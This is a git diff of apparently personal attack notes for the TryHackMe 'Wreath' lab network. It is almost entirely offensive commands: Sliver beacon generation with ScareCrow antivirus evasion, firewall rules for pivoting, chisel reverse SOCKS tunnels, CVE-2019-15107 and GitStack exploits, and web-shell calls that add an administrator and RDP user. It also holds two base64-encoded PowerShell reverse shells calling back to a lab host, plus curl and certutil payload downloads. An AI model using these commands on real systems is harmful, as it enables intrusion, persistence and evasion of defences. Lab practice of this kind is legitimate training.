@@ -11,6 +11,14 @@ echo "10.200.X.200 thomaswreath.thm thomaswreath.thm.evil.com" | sudo tee -a /et
 generate beacon --http 10.50.55.42:2222 --arch amd64 --os linux --save /home/kali/Wreath/PROD-SERV-S
 
 
+generate beacon --tcp-pivot  10.200.57.200:9898 --arch amd64 --os windows --save /home/kali/Wreath/GIT-SERV-S-Pivot.bin -f shellcode -G
+/opt/ScareCrow/ScareCrow -I /home/kali/Wreath/GIT-SERV-S-Pivot.bin -Loader binary -domain microsoft.com -obfu -Evasion KnownDLL 
+GOOS=windows GOARCH=amd64 go build -ldflags="-s -w"
+
+netsh advfirewall firewall add rule name="nvm-sliver-tcp-pivot" dir=in action=allow protocol=tcp localport=9898
+
+netsh advfirewall firewall add rule name="nvm-sliver-tcp-pivot" dir=out action=allow protocol=tcp localport=9898
+
 generate beacon --http 10.200.57.200:10005 --arch amd64 --os windows --save /home/kali/Wreath/GIT-SERV-S.bin -f shellcode -G
 
 /opt/ScareCrow/ScareCrow -I /home/kali/Wreath/GIT-SERV-S.bin -Loader binary -domain microsoft.com -obfu -Evasion KnownDLL 
@@ -32,11 +40,16 @@ http -L 10.50.55.42 -l 10010
 # Prod
 # For git-serv reverse shell
 nohup ./chisel client 10.50.55.42:10000 R:10005:socks &
-firewall-cmd --zone=public --add-port 10005/tcp
+firewall-cmd --zone=public --add-port 9898/tcp
+
+for i in $(seq 10001 10010); do firewall-cmd --zone=public --add-port $i/tcp; done
 
 # gitstack, add a rule and a reverse socks proxy 
-netsh advfirewall firewall add rule name="nvmChisel-Git" dir=in action=allow protocol=tcp localport=10005
-start-job { .\chisel.exe client 10.50.55.42:10000 R:10005:10.200.57.150:10005:10.200.57.200:socks  }
+netsh advfirewall firewall add rule name="nvm-sliver" dir=in action=allow protocol=tcp localport=10005
+netsh advfirewall firewall add rule name="nvm-sliver" dir=out action=allow protocol=tcp localport=10005
+
+
+# start-job { .\chisel.exe client 10.50.55.42:10000 R:10005:10.200.57.150:10005:10.200.57.200:socks  }
 
 # Personal Sliver -> git -> prod-server -> chisel 
 # Prod
@@ -54,7 +67,6 @@ source .venv/bin/activate
 pip3 install -r requirements.txt
 python3 CVE-2019-15107.py
 
-
 curl http://10.50.55.42/chisel.exe -o chisel.exe
 curl http://10.50.55.42/chisel -o chisel
 curl http://10.50.55.42/PROD-SERV-S -o systemCtl
@@ -68,13 +80,11 @@ nohup ./chisel client 10.50.55.42:10000 R:10001:socks &
 # modify /etc/proxychains4.conf socks5 127.0.0.1 10001
 
 # Reverse Port forward for gitstack exploit
-nohup ./chisel client 10.50.55.42:10000 R:127.0.0.1:10002:10.200.84.150:80 &
+nohup ./chisel client 10.50.55.42:10000 R:127.0.0.1:10002:10.200.57.150:80 &
 # For git-serv reverse shell
-nohup ./chisel client 10.50.55.42:10000 R:10001:socks &
+nohup ./chisel client 10.50.55.42:10000 R:10003:socks &
 
 
-
-firewall-cmd --zone=public --add-port $PORT/tcp
 
 python2 gitstackRCE.py
 
@@ -82,6 +92,10 @@ python2 gitstackRCE.py
 curl http://127.0.0.1:10002/web/exploit-nvm.php -d 'a=net+user+nvm+nvmNVM69!+/add'
 curl http://127.0.0.1:10002/web/exploit-nvm.php -d 'a=net+localgroup+Administrators+nvm+/add'
 curl http://127.0.0.1:10002/web/exploit-nvm.php -d 'a=net+localgroup+"Remote+Desktop+Users"+nvm+/add'
+
+
+start /B powershell.exe -EncodedCommand 'JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMgAwADAALgA1ADcALgAyADAAMAAnACwAMQAwADAAMAAzACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAAoA' 
+
 
 # 
 # For some reason this did not work
@@ -102,6 +116,11 @@ proxychains4 xfreerdp /v:10.200.57.150 /u:nvm /p:'nvmNVM69!' +clipboard /dynamic
 
 # Very cool RDP command
 `xfreerdp /v:IP /u:USERNAME /p:PASSWORD +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share`
+# Very cool background in Dos
+start /B program
+
+# 
+start /B powershell.exe -ep bypass -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMgAwADAALgA1ADcALgAyADAAMAAnACwAMQAwADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAAoA
 
 # cmd = GIT-SERV-S.bin
 # Pwerpnt.exe = PROD.bin
@@ -112,10 +131,8 @@ start-job { cmd.exe }
 nohup python3 -m http.server 8443 &
 certutil.exe -urlcache -f -split http://10.200.96.200:8443/Excel.exe -o Excel.exe
 
-# 
-# netsh firewall configuration, beacon and chisel!
-# 
-socat TCP-LISTEN:127.0.0.1:10005,reuseaddr,fork TCP:<destination_ip>:<destination_port>
+
+
 
 
 
